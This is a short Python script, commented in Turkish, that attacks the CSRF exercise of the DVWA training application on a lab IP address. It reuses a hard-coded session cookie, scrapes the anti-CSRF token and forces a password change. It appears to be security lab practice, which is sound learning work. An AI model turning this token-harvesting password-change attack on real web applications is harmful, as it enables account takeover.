"""
author: Beren Kuday GÖRÜN
"""

import requests
from bs4 import BeautifulSoup
#pip3 install bs4


cookies = {
	'security': 'high',
	'PHPSESSID':'54ca199796e7d2d65c600e74e13c92e3'
}

url = 'http://10.0.2.7/dvwa2/vulnerabilities/csrf/'

istek = requests.get(url, cookies=cookies)

kaynak_koduParser = BeautifulSoup(istek.content,"lxml")

tokenDurumu = 0
token = ""
try:#token varsa
	token  = kaynak_koduParser.find('input', {'name': 'user_token'}).get('value')
	print("[*] CSRF için token tespit edildi:", token)
	tokenDurumu = 1
except:
	print("[*] Token tespit edilemedi. Saldırıya devam ediliyor...")

yeniSifre = "beren"

url = "http://10.0.2.7/dvwa2/vulnerabilities/csrf/?password_new="+ yeniSifre + "&password_conf=" + yeniSifre + "&Change=Change"
if(tokenDurumu):
	url = url + "&user_token=" + token
istek = requests.get(url, cookies=cookies)

if(str(istek.content).find("Password Changed.") != -1):
	print("[*] Şifre değiştirildi yeni şifre:", yeniSifre)
else:
	print("[*] Başarısız işlem!")

